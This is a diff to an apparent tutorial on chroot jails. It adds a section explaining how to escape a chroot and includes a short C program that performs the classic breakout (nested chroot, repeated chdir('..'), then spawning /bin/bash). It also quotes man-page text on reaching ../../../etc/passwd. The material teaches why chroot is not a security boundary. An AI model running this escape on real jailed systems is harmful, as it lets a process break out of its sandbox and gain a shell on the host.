@@ -98,6 +98,37 @@ We saw that we can create an environment that is called a jail where a process k
 
 > This call changes an ingredient in the pathname resolution process and does nothing else.  In particular, it is not intended to be used for any kind of security purpose, neither to fully  sandbox  a process  nor  to  restrict  filesystem system calls.  In the past, chroot() has been used by daemons to restrict themselves prior to passing paths supplied by untrusted users to system calls such as open(2).  However, if a folder is moved out of the chroot directory, an attacker can exploit that to get out of the chroot directory as well.  The easiest way to do that is to chdir(2) to the to-be-moved directory, wait for it to be moved out, then open a path like ../../../etc/passwd.
 
+# How to escape a chroot ?
+
+The way to escape of a chroot jail is to ...
+
+Let's write this C program :
+
+```c
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void)
+{
+  // Create the new directory for escaping
+  mkdir("escape", 0755);
+
+  // Chroot into it
+  chroot("escape");
+
+  // Change dir many time to reach the top
+  for(int i = 0; i < 1024; i++) {
+    chdir("..");
+  }
+
+  // Chroot into that top directory
+  chroot(".");
+
+  // Start a shell
+  system("/bin/bash");
+}
+```
 
 ## A step forward with namespaces
 
